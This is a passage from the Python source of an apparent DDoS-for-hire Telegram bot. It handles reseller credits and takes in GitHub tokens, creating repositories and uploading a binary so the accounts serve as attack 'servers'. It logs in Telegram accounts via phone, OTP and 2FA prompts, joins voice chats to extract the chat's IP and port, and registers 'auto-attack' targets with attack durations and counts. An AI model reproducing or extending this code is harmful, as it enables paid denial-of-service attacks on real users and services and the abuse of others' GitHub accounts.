                "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛",
                reply_markup=reply_markup
            )

        except ValueError:
            await update.message.reply_text(
                "╔════════════════════════════════╗\n"
                "║  ❌  ɪɴᴠᴀʟɪᴅ ᴜꜱᴇʀ ɪᴅ           ║\n"
                "╚════════════════════════════════╝\n"
                "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                "┃  🔢 ᴜꜱᴇʀ ɪᴅ ᴍᴜꜱᴛ ʙᴇ ᴀ ɴᴜᴍʙᴇʀ. ┃\n"
                "┠────────────────────────────────┨\n"
                "┃  📎 ᴘʟᴇᴀꜱᴇ ꜱᴇɴᴅ ᴀ ᴠᴀʟɪᴅ ᴜꜱᴇʀ ɪᴅ┃\n"
                "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
            )

    # ─────────────────────────────────────────────────────────────
    #  💰   A D D   R E S E L L E R   —   S T E P   3 / 3
    # ─────────────────────────────────────────────────────────────
    elif step == "reseller_add_username":
        username = text.strip()
        reseller_id = temp_data[user_id]["reseller_id"]
        credits = temp_data[user_id]["credits"]

        if str(reseller_id) in resellers:
            await update.message.reply_text(
                "╔════════════════════════════════╗\n"
                "║  ❌  ᴜꜱᴇʀ ᴀʟʀᴇᴀᴅʏ ʀᴇꜱᴇʟʟᴇʀ   ║\n"
                "╚════════════════════════════════╝"
            )
            del temp_data[user_id]
            return

        resellers[str(reseller_id)] = {
            "username": username,
            "credits": credits,
            "added_by": user_id,
            "added_date": time.strftime("%Y-%m-%d %H:%M:%S"),
            "expiry": "LIFETIME",
            "total_added": 0
        }
        save_resellers(resellers)

        try:
            await context.bot.send_message(
                chat_id=reseller_id,
                text=(
                    "╔════════════════════════════════╗\n"
                    "║  💰  ᴄᴏɴɢʀᴀᴛᴜʟᴀᴛɪᴏɴꜱ!          ║\n"
                    "╚════════════════════════════════╝\n"
                    "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                    "┃  ʏᴏᴜ ʜᴀᴠᴇ ʙᴇᴇɴ ᴀᴅᴅᴇᴅ ᴀꜱ ᴀ    ┃\n"
                    "┃  ʀᴇꜱᴇʟʟᴇʀ!                      ┃\n"
                    "┠────────────────────────────────┨\n"
                    f"┃  💳 ɪɴɪᴛɪᴀʟ ᴄʀᴇᴅɪᴛꜱ: {credits:<9}┃\n"
                    "┃                                ┃\n"
                    "┃  ʏᴏᴜ ᴄᴀɴ ɴᴏᴡ ᴍᴀɴᴀɢᴇ ᴜꜱᴇʀꜱ.    ┃\n"
                    "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
                )
            )
        except Exception:
            pass

        reply_markup = get_main_keyboard(user_id)
        await update.message.reply_text(
            "╔════════════════════════════════╗\n"
            "║  ✅  ʀᴇꜱᴇʟʟᴇʀ ᴀᴅᴅᴇᴅ           ║\n"
            "╚════════════════════════════════╝\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            f"┃  💰 ʀᴇꜱᴇʟʟᴇʀ ɪᴅ: `{reseller_id}`\n"
            f"┃  📛 ᴜꜱᴇʀɴᴀᴍᴇ: @{username:<15}\n"
            f"┃  💳 ᴄʀᴇᴅɪᴛꜱ: {credits}\n"
            f"┃  👤 ᴀᴅᴅᴇᴅ ʙʏ: `{user_id}`\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛",
            reply_markup=reply_markup
        )

        del temp_data[user_id]

    # ─────────────────────────────────────────────────────────────
    #  🗑️   R E M O V E   R E S E L L E R
    # ─────────────────────────────────────────────────────────────
    elif step == "reseller_remove_id":
        try:
            reseller_to_remove = int(text.strip())

            if str(reseller_to_remove) not in resellers:
                await update.message.reply_text(
                    "╔════════════════════════════════╗\n"
                    "║  ❌  ᴜꜱᴇʀ ɴᴏᴛ ʀᴇꜱᴇʟʟᴇʀ         ║\n"
                    "╚════════════════════════════════╝"
                )
                del temp_data[user_id]
                return

            removed_username = resellers[str(reseller_to_remove)].get("username", "")
            del resellers[str(reseller_to_remove)]
            save_resellers(resellers)

            try:
                await context.bot.send_message(
                    chat_id=reseller_to_remove,
                    text=(
                        "╔════════════════════════════════╗\n"
                        "║  ⚠️  ɴᴏᴛɪꜰɪᴄᴀᴛɪᴏɴ            ║\n"
                        "╚════════════════════════════════╝\n"
                        "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                        "┃  ʏᴏᴜʀ ʀᴇꜱᴇʟʟᴇʀ ᴀᴄᴄᴇꜱꜱ ʜᴀꜱ   ┃\n"
                        "┃  ʙᴇᴇɴ ʀᴇᴠᴏᴋᴇᴅ ꜰʀᴏᴍ ᴛʜᴇ ʙᴏᴛ. ┃\n"
                        "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
                    )
                )
            except Exception:
                pass

            reply_markup = get_main_keyboard(user_id)
            await update.message.reply_text(
                "╔════════════════════════════════╗\n"
                "║  ✅  ʀᴇꜱᴇʟʟᴇʀ ʀᴇᴍᴏᴠᴇᴅ         ║\n"
                "╚════════════════════════════════╝\n"
                "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                f"┃  💰 ʀᴇꜱᴇʟʟᴇʀ ɪᴅ: `{reseller_to_remove}`\n"
                f"┃  📛 ᴜꜱᴇʀɴᴀᴍᴇ: @{removed_username:<12}\n"
                f"┃  👤 ʀᴇᴍᴏᴠᴇᴅ ʙʏ: `{user_id}`\n"
                "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛",
                reply_markup=reply_markup
            )

            del temp_data[user_id]

        except ValueError:
            await update.message.reply_text(
                "╔════════════════════════════════╗\n"
                "║  ❌  ɪɴᴠᴀʟɪᴅ ᴜꜱᴇʀ ɪᴅ           ║\n"
                "╚════════════════════════════════╝\n"
                "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                "┃  🔢 ᴜꜱᴇʀ ɪᴅ ᴍᴜꜱᴛ ʙᴇ ᴀ ɴᴜᴍʙᴇʀ. ┃\n"
                "┠────────────────────────────────┨\n"
                "┃  📎 ᴘʟᴇᴀꜱᴇ ꜱᴇɴᴅ ᴀ ᴠᴀʟɪᴅ ᴜꜱᴇʀ ɪᴅ┃\n"
                "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
            )

    # ─────────────────────────────────────────────────────────────
    #  🔑   A D D   T O K E N
    # ─────────────────────────────────────────────────────────────
    elif step == "token_add":
        token = text.strip()
        repo_name = "flashcrack-tg"

        try:
            for existing_token in github_tokens:
                if existing_token['token'] == token:
                    await update.message.reply_text(
                        "╔════════════════════════════════╗\n"
                        "║  ❌  ᴛᴏᴋᴇɴ ᴀʟʀᴇᴀᴅʏ ᴇxɪꜱᴛꜱ       ║\n"
                        "╚════════════════════════════════╝"
                    )
                    del temp_data[user_id]
                    return

            await update.message.reply_text(
                "╔════════════════════════════════╗\n"
                "║  🔄  ᴀᴅᴅɪɴɢ ᴛᴏᴋᴇɴ...            ║\n"
                "╚════════════════════════════════╝"
            )

            g = Github(auth=Auth.Token(token))
            user = g.get_user()
            username = user.login

            repo, created = create_repository(token, repo_name)

            new_token_data = {
                'token': token,
                'username': username,
                'repo': f"{username}/{repo_name}",
                'added_date': time.strftime("%Y-%m-%d %H:%M:%S"),
                'status': 'active'
            }
            github_tokens.append(new_token_data)
            save_github_tokens(github_tokens)

            update_yml_file(token, new_token_data["repo"], "", 0, 0, "validation")

            binary_content = load_binary_file()
            if binary_content:
                success, status = upload_binary_to_repo(new_token_data, binary_content)
                binary_status = (
                    "┃  ✅ ʙɪɴᴀʀʏ ᴜᴘʟᴏᴀᴅᴇᴅ"
                    if success else
                    f"┃  ⚠️ ʙɪɴᴀʀʏ ꜰᴀɪʟ: {status[:14]}"
                )
            else:
                binary_status = "┃  ⚠️ ɴᴏ ʙɪɴᴀʀʏ ꜰɪʟᴇ"

            reply_markup = get_main_keyboard(user_id)

            status_icon = "✅" if created else "🔄"
            status_text = "ɴᴇᴡ ʀᴇᴘᴏ ᴄʀᴇᴀᴛᴇᴅ" if created else "ᴛᴏᴋᴇɴ ᴀᴅᴅᴇᴅ"

            message = (
                "╔════════════════════════════════╗\n"
                f"║  {status_icon}  {status_text:<24}║\n"
                "╚════════════════════════════════╝\n"
                "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                f"┃  👤 ᴜꜱᴇʀɴᴀᴍᴇ: @{username:<15}\n"
                f"┃  📁 ʀᴇᴘᴏ: `{repo_name}`\n"
                f"┃  📊 ꜱᴇʀᴠᴇʀꜱ: {len(github_tokens)}\n"
                "┠────────────────────────────────┨\n"
                f"{binary_status}\n"
                "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
            )

            await update.message.reply_text(message, reply_markup=reply_markup)
            del temp_data[user_id]

        except Exception as e:
            await update.message.reply_text(
                "╔════════════════════════════════╗\n"
                "║  ❌  ᴇʀʀᴏʀ                      ║\n"
                "╚════════════════════════════════╝\n"
                "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                f"┃  {str(e)[:28]:<30}┃\n"
                "┠────────────────────────────────┨\n"
                "┃  🔎 ᴘʟᴇᴀꜱᴇ ᴄʜᴇᴄᴋ ᴛʜᴇ ᴛᴏᴋᴇɴ.    ┃\n"
                "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
            )
            del temp_data[user_id]

    # ─────────────────────────────────────────────────────────────
    #  ✖️   R E M O V E   T O K E N
    # ─────────────────────────────────────────────────────────────
    elif step == "token_remove":
        try:
            token_num = int(text.strip())
            if token_num < 1 or token_num > len(github_tokens):
                await update.message.reply_text(
                    "╔════════════════════════════════╗\n"
                    "║  ❌  ɪɴᴠᴀʟɪᴅ ɴᴜᴍʙᴇʀ             ║\n"
                    "╚════════════════════════════════╝\n"
                    "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                    f"┃  📊 ᴜꜱᴇ 1-{len(github_tokens):<24}┃\n"
                    "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
                )
                del temp_data[user_id]
                return

            removed_token = github_tokens.pop(token_num - 1)
            save_github_tokens(github_tokens)

            reply_markup = get_main_keyboard(user_id)
            await update.message.reply_text(
                "╔════════════════════════════════╗\n"
                "║  ✅  ꜱᴇʀᴠᴇʀ ʀᴇᴍᴏᴠᴇᴅ!           ║\n"
                "╚════════════════════════════════╝\n"
                "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                f"┃  👤 ꜱᴇʀᴠᴇʀ: @{removed_token['username']:<12}\n"
                f"┃  📁 ʀᴇᴘᴏ: `{removed_token['repo'][:20]}`\n"
                f"┃  📊 ʀᴇᴍᴀɪɴɪɴɢ: {len(github_tokens)}\n"
                "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛",
                reply_markup=reply_markup
            )

            del temp_data[user_id]

        except ValueError:
            await update.message.reply_text(
                "╔════════════════════════════════╗\n"
                "║  ❌  ɪɴᴠᴀʟɪᴅ ɴᴜᴍʙᴇʀ             ║\n"
                "╚════════════════════════════════╝\n"
                "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                "┃  📎 ᴘʟᴇᴀꜱᴇ ꜱᴇɴᴅ ᴀ ᴠᴀʟɪᴅ        ┃\n"
                "┃     ɴᴜᴍʙᴇʀ.                    ┃\n"
                "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
            )

    # ─────────────────────────────────────────────────────────────
    #  📢   B R O A D C A S T
    # ─────────────────────────────────────────────────────────────
    elif step == "broadcast_message":
        message = text
        del temp_data[user_id]
        await send_broadcast(update, context, message, user_id)

    # ─────────────────────────────────────────────────────────────
    #  📤   B I N A R Y   U P L O A D   (text instead of file)
    # ─────────────────────────────────────────────────────────────
    elif step == "binary_upload":
        await update.message.reply_text(
            "╔════════════════════════════════╗\n"
            "║  ❌  ᴘʟᴇᴀꜱᴇ ꜱᴇɴᴅ ᴀ ꜰɪʟᴇ         ║\n"
            "╚════════════════════════════════╝\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  📎 ɴᴏᴛ ᴛᴇxᴛ. ꜱᴇɴᴅ ʏᴏᴜʀ        ┃\n"
            "┃     ʙɪɴᴀʀʏ ꜰɪʟᴇ.              ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
        )

    # ═════════════════════════════════════════════════════════════
    #                    📡   I P   P A N E L   F L O W S
    # ═════════════════════════════════════════════════════════════

    # ─────────────────────────────────────────────────────────────
    #  ➕   A D D   S E S S I O N   —   S T E P   1 / 3
    # ─────────────────────────────────────────────────────────────
    elif step == "ip_add_session_name":
        session_name = text.strip()

        if not valid_ip_session_name(session_name):
            await update.message.reply_text(
                "╔════════════════════════════════╗\n"
                "║  ❌  ɪɴᴠᴀʟɪᴅ ɴᴀᴍᴇ              ║\n"
                "╚════════════════════════════════╝\n"
                "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                "┃  📋 ᴏɴʟʏ ᴀ-ᴢ, 0-9, _ , -       ┃\n"
                "┃     ᴀʟʟᴏᴡᴇᴅ (ᴍᴀx 50 ᴄʜᴀʀꜱ).   ┃\n"
                "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
            )
            return

        if session_name in ip_accounts:
            await update.message.reply_text(
                "╔════════════════════════════════╗\n"
                "║  ❌  ꜱᴇꜱꜱɪᴏɴ ᴀʟʀᴇᴀᴅʏ ᴇxɪꜱᴛꜱ   ║\n"
                "╚════════════════════════════════╝"
            )
            del temp_data[user_id]
            return

        temp_data[user_id] = {
            "step": "ip_add_session_phone",
            "session_name": session_name
        }
        await update.message.reply_text(
            "╔════════════════════════════════╗\n"
            "║  ➕  ᴀᴅᴅ ꜱᴇꜱꜱɪᴏɴ - 2/3        ║\n"
            "╚════════════════════════════════╝\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            f"┃  ✅ ꜱᴇꜱꜱɪᴏɴ: `{session_name}`\n"
            "┠────────────────────────────────┨\n"
            "┃  📱 ꜱᴇɴᴅ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ         ┃\n"
            "┃     (ᴡɪᴛʜ ᴄᴏᴜɴᴛʀʏ ᴄᴏᴅᴇ)        ┃\n"
            "┃                                ┃\n"
            "┃  ᴇxᴀᴍᴘʟᴇ: `+919876543210`     ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛",
            reply_markup=get_cancel_keyboard()
        )

    # ─────────────────────────────────────────────────────────────
    #  📱   A D D   S E S S I O N   —   S T E P   2 / 3   (Phone)
    # ─────────────────────────────────────────────────────────────
    elif step == "ip_add_session_phone":
        phone = text.strip()
        session_name = temp_data[user_id]["session_name"]
        session_path = os.path.join(IP_SESSIONS_DIR, session_name)

        if not PYROGRAM_AVAILABLE:
            await update.message.reply_text("❌ Pyrogram not installed.")
            del temp_data[user_id]
            return

        try:
            client = PyroClient(session_path, api_id=IP_API_ID, api_hash=IP_API_HASH)
            await client.connect()
            sent_code = await client.send_code(phone)

            ip_clients[f"temp_{session_name}"] = client
            temp_data[user_id] = {
                "step": "ip_add_session_otp",
                "session_name": session_name,
                "phone": phone,
                "phone_code_hash": sent_code.phone_code_hash
            }
            await update.message.reply_text(
                "╔════════════════════════════════╗\n"
                "║  📱  ᴏᴛᴘ ꜱᴇɴᴛ                 ║\n"
                "╚════════════════════════════════╝\n"
                "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                f"┃  📞 ᴛᴏ: `{phone}`\n"
                "┠────────────────────────────────┨\n"
                "┃  ✉️ ꜱᴇɴᴅ ᴛʜᴇ ᴏᴛᴘ ᴄᴏᴅᴇ        ┃\n"
                "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛",
                reply_markup=get_cancel_keyboard()
            )
        except Exception as e:
            logger.error(f"IP panel send_code error: {e}", exc_info=True)
            await update.message.reply_text(
                "╔════════════════════════════════╗\n"
                "║  ❌  ᴇʀʀᴏʀ                      ║\n"
                "╚════════════════════════════════╝\n"
                "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                f"┃  {str(e)[:28]:<30}┃\n"
                "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
            )
            try:
                await client.disconnect()
            except Exception:
                pass
            ip_clients.pop(f"temp_{session_name}", None)
            if user_id in temp_data:
                del temp_data[user_id]

    # ─────────────────────────────────────────────────────────────
    #  🔐   A D D   S E S S I O N   —   S T E P   3 / 3   (OTP)
    # ─────────────────────────────────────────────────────────────
    elif step == "ip_add_session_otp":
        code = text.strip()
        session_name = temp_data[user_id]["session_name"]
        phone = temp_data[user_id]["phone"]
        phone_code_hash = temp_data[user_id]["phone_code_hash"]
        client = ip_clients.get(f"temp_{session_name}")

        if not client:
            await update.message.reply_text(
                "╔════════════════════════════════╗\n"
                "║  ❌  ꜱᴇꜱꜱɪᴏɴ ᴇxᴘɪʀᴇᴅ           ║\n"
                "╚════════════════════════════════╝\n"
                "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                "┃  📎 ᴘʟᴇᴀꜱᴇ ꜱᴛᴀʀᴛ ᴀɢᴀɪɴ.        ┃\n"
                "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
            )
            del temp_data[user_id]
            return

        try:
            await client.sign_in(phone, phone_code_hash, code)
            me = await client.get_me()

            ip_accounts[session_name] = {
                "phone": me.phone_number or phone,
                "user_id": me.id,
                "username": me.username or "No username",
                "first_name": me.first_name or "",
                "status": "active",
                "type": "login"
            }
            save_ip_accounts(ip_accounts)

            try:
                await client.disconnect()
            except Exception:
                pass
            ip_clients.pop(f"temp_{session_name}", None)
            del temp_data[user_id]

            await update.message.reply_text(
                "╔════════════════════════════════╗\n"
                "║  ✅  ꜱᴇꜱꜱɪᴏɴ ᴀᴅᴅᴇᴅ!            ║\n"
                "╚════════════════════════════════╝\n"
                "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                f"┃  📁 `{session_name}`\n"
                f"┃  👤 {me.first_name or 'N/A'}\n"
                f"┃  🆔 @{me.username or 'none'}\n"
                "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛",
                reply_markup=get_main_keyboard(user_id)
            )
        except Exception as e:
            err_name = type(e).__name__
            if "Password" in err_name or "SESSION_PASSWORD" in str(e):
                temp_data[user_id]["step"] = "ip_add_session_2fa"
                await update.message.reply_text(
                    "╔════════════════════════════════╗\n"
                    "║  🔐  2FA ʀᴇQᴜɪʀᴇᴅ             ║\n"
                    "╚════════════════════════════════╝\n"
                    "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                    "┃  🔑 ꜱᴇɴᴅ ʏᴏᴜʀ ᴘᴀꜱꜱᴡᴏʀᴅ        ┃\n"
                    "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛",
                    reply_markup=get_cancel_keyboard()
                )
            else:
                await update.message.reply_text(
                    "╔════════════════════════════════╗\n"
                    "║  ❌  ᴇʀʀᴏʀ                      ║\n"
                    "╚════════════════════════════════╝\n"
                    "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                    f"┃  {str(e)[:28]:<30}┃\n"
                    "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
                )
                try:
                    await client.disconnect()
                except Exception:
                    pass
                ip_clients.pop(f"temp_{session_name}", None)
                if user_id in temp_data:
                    del temp_data[user_id]

    # ─────────────────────────────────────────────────────────────
    #  🔐   A D D   S E S S I O N   —   2 F A
    # ─────────────────────────────────────────────────────────────
    elif step == "ip_add_session_2fa":
        password = text.strip()
        session_name = temp_data[user_id]["session_name"]
        client = ip_clients.get(f"temp_{session_name}")

        if not client:
            await update.message.reply_text(
                "╔════════════════════════════════╗\n"
                "║  ❌  ꜱᴇꜱꜱɪᴏɴ ᴇxᴘɪʀᴇᴅ           ║\n"
                "╚════════════════════════════════╝"
            )
            del temp_data[user_id]
            return

        try:
            await client.check_password(password)
            me = await client.get_me()

            ip_accounts[session_name] = {
                "phone": me.phone_number or "N/A",
                "user_id": me.id,
                "username": me.username or "No username",
                "first_name": me.first_name or "",
                "status": "active",
                "type": "login"
            }
            save_ip_accounts(ip_accounts)

            try:
                await client.disconnect()
            except Exception:
                pass
            ip_clients.pop(f"temp_{session_name}", None)
            del temp_data[user_id]

            await update.message.reply_text(
                "╔════════════════════════════════╗\n"
                "║  ✅  ꜱᴇꜱꜱɪᴏɴ ᴀᴅᴅᴇᴅ!            ║\n"
                "╚════════════════════════════════╝\n"
                "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                f"┃  📁 `{session_name}`\n"
                f"┃  👤 {me.first_name or 'N/A'}\n"
                "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛",
                reply_markup=get_main_keyboard(user_id)
            )
        except Exception as e:
            await update.message.reply_text(
                "╔════════════════════════════════╗\n"
                "║  ❌  ɪɴᴠᴀʟɪᴅ ᴘᴀꜱꜱᴡᴏʀᴅ           ║\n"
                "╚════════════════════════════════╝\n"
                "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                f"┃  {str(e)[:28]:<30}┃\n"
                "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
            )

    # ─────────────────────────────────────────────────────────────
    #  🌐   G E T   V C   I P
    # ─────────────────────────────────────────────────────────────
    elif step == "ip_get_ip_chat":
        chat_input = text.strip()
        session_name = get_random_ip_session()

        if not session_name:
            await update.message.reply_text(
                "╔════════════════════════════════╗\n"
                "║  ❌  ɴᴏ ꜱᴇꜱꜱɪᴏɴꜱ ᴀᴠᴀɪʟᴀʙʟᴇ     ║\n"
                "╚════════════════════════════════╝"
            )
            del temp_data[user_id]
            return

        await update.message.reply_text(
            "╔════════════════════════════════╗\n"
            "║  ⚡  ᴡᴏʀᴋɪɴɢ...                ║\n"
            "╚════════════════════════════════╝\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            f"┃  📁 ᴜꜱɪɴɢ: `{session_name}`\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
        )

        try:
            client = await get_ip_client(session_name)
            if not client:
                await update.message.reply_text("❌ Session unavailable.")
                del temp_data[user_id]
                return

            chat = await resolve_ip_chat(client, chat_input)
            chat_id = chat.id
            chat_title = chat.title or "Unknown"

            full = await client.invoke(
                GetFullChannel(channel=await client.resolve_peer(chat_id))
            )
            if not full.full_chat.call:
                await update.message.reply_text(
                    "╔════════════════════════════════╗\n"
                    "║  ❌  ɴᴏ ᴀᴄᴛɪᴠᴇ ᴠᴄ              ║\n"
                    "╚════════════════════════════════╝\n"
                    "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                    "┃  💬 ᴛʜᴇʀᴇ ɪꜱ ɴᴏ ᴀᴄᴛɪᴠᴇ        ┃\n"
                    "┃     ᴠᴄ ɪɴ ᴛʜɪꜱ ɢʀᴏᴜᴘ.          ┃\n"
                    "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
                )
                del temp_data[user_id]
                return

            me = await client.get_me()
            start = time.time()
            result = await client.invoke(
                JoinGroupCall(
                    call=full.full_chat.call,
                    join_as=await client.resolve_peer(me.id),
                    muted=True,
                    video_stopped=True,
                    params=DataJSON(data=json.dumps({"ssrc": random.getrandbits(32)}))
                )
            )
            duration = round((time.time() - start) * 1000, 2)

            params_data = result.updates[-1].params.data
            requested = json.loads(params_data)["transport"]["candidates"][1]

            try:
                await client.invoke(
                    LeaveGroupCall(call=full.full_chat.call, source=0)
                )
            except Exception:
                pass

            await update.message.reply_text(
                "╔════════════════════════════════╗\n"
                "║  🎯  ᴠᴄ ɪᴘ ꜰᴏᴜɴᴅ              ║\n"
                "╚════════════════════════════════╝\n"
                "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                f"┃  📁 ᴀᴄᴄᴏᴜɴᴛ: `{session_name}`\n"
                f"┃  💬 ᴄʜᴀᴛ: {chat_title[:22]}\n"
                "┠────────────────────────────────┨\n"
                f"┃  🌐 ɪᴘ: `{requested['ip']}:{requested['port']}`\n"
                f"┃  ⚡ ᴛɪᴍᴇ: {duration} ms\n"
                "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛",
                reply_markup=get_ip_panel_keyboard()
            )
            del temp_data[user_id]

        except Exception as e:
            logger.error(f"IP get error: {e}", exc_info=True)
            await update.message.reply_text(
                "╔════════════════════════════════╗\n"
                "║  ❌  ᴇʀʀᴏʀ                      ║\n"
                "╚════════════════════════════════╝\n"
                "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                f"┃  {str(e)[:28]:<30}┃\n"
                "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
            )
            if user_id in temp_data:
                del temp_data[user_id]

    # ─────────────────────────────────────────────────────────────
    #  🗑️   R E M O V E   S E S S I O N
    # ─────────────────────────────────────────────────────────────
    elif step == "ip_remove_session_name":
        session_name = text.strip()

        if session_name not in ip_accounts:
            await update.message.reply_text(
                "╔════════════════════════════════╗\n"
                "║  ❌  ꜱᴇꜱꜱɪᴏɴ ɴᴏᴛ ꜰᴏᴜɴᴅ         ║\n"
                "╚════════════════════════════════╝"
            )
            del temp_data[user_id]
            return

        if session_name in ip_clients:
            try:
                await ip_clients[session_name].disconnect()
            except Exception:
                pass
            ip_clients.pop(session_name, None)

        session_path = os.path.join(IP_SESSIONS_DIR, f"{session_name}.session")
        try:
            if os.path.exists(session_path):
                os.remove(session_path)
        except Exception as e:
            logger.warning(f"Could not delete session file: {e}")

        del ip_accounts[session_name]
        save_ip_accounts(ip_accounts)
        del temp_data[user_id]

        await update.message.reply_text(
            "╔════════════════════════════════╗\n"
            "║  ✅  ꜱᴇꜱꜱɪᴏɴ ʀᴇᴍᴏᴠᴇᴅ          ║\n"
            "╚════════════════════════════════╝\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            f"┃  📁 `{session_name}`\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛",
            reply_markup=get_main_keyboard(user_id)
        )

    # ═════════════════════════════════════════════════════════════
    #              💀   A U T O   A T T A C K   F L O W S
    # ═════════════════════════════════════════════════════════════

    # ─────────────────────────────────────────────────────────────
    #  ➕   N E W   D E T E C T O R   (chat input)
    # ─────────────────────────────────────────────────────────────
    elif step == "ip_auto_attack_chat":
        chat_input = text.strip()
        session_name = get_random_ip_session()

        if not session_name:
            await update.message.reply_text(
                "╔════════════════════════════════╗\n"
                "║  ❌  ɴᴏ ꜱᴇꜱꜱɪᴏɴꜱ                ║\n"
                "╚════════════════════════════════╝"
            )
            del temp_data[user_id]
            return

        try:
            client = await get_ip_client(session_name)
            if not client:
                await update.message.reply_text("❌ Session unavailable.")
                del temp_data[user_id]
                return

            chat = await resolve_ip_chat(client, chat_input)
            chat_id_str = str(chat.id)
            chat_title = chat.title or "Unknown"

            if chat_id_str in auto_attack_targets:
                await update.message.reply_text(
                    "╔════════════════════════════════╗\n"
                    "║  ⚠️  ᴀʟʀᴇᴀᴅʏ ᴇxɪꜱᴛꜱ            ║\n"
                    "╚════════════════════════════════╝\n"
                    "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                    f"┃  🆔 `{chat_id_str}`\n"
                    "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
                )
                del temp_data[user_id]
                return

            auto_attack_targets[chat_id_str] = {
                "chat_id": chat.id,
                "chat_title": chat_title,
                "session_name": session_name,
                "enabled": True,
                "mode": "detector",
                "banned_sessions": [],
                "attack_duration": AUTO_ATTACK_DEFAULT_DURATION,
                "attack_count": 0,
                "last_ip": None, "last_port": None,
                "last_attack_time": None,
                "last_attack_method": None,
                "last_success_servers": 0,
                "added_by": user_id,
                "added_date": time.strftime("%Y-%m-%d %H:%M:%S")
            }
            save_auto_attacks()

            if AUTO_ATTACK_LOOP_TASK is None or AUTO_ATTACK_LOOP_TASK.done():
                AUTO_ATTACK_LOOP_TASK = asyncio.create_task(auto_attack_loop())

            await update.message.reply_text(
                "╔════════════════════════════════╗\n"
                "║  ✅  ᴀᴜᴛᴏ-ᴀᴛᴛᴀᴄᴋ ᴏɴ!          ║\n"
                "╚════════════════════════════════╝\n"
                "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                "┃  🎯 ᴍᴏᴅᴇ: 🔍 ᴅᴇᴛᴇᴄᴛᴏʀ         ┃\n"
                "┠────────────────────────────────┨\n"
                f"┃  💬 {chat_title[:22]}\n"
                f"┃  🆔 `{chat_id_str}`\n"
                f"┃  📁 `{session_name}`\n"
                "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛",
                reply_markup=get_auto_attack_keyboard()
            )
            del temp_data[user_id]

        except Exception as e:
            logger.error(f"auto-attack setup error: {e}")
            await update.message.reply_text(
                "╔════════════════════════════════╗\n"
                "║  ❌  ᴇʀʀᴏʀ                      ║\n"
                "╚════════════════════════════════╝\n"
                "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
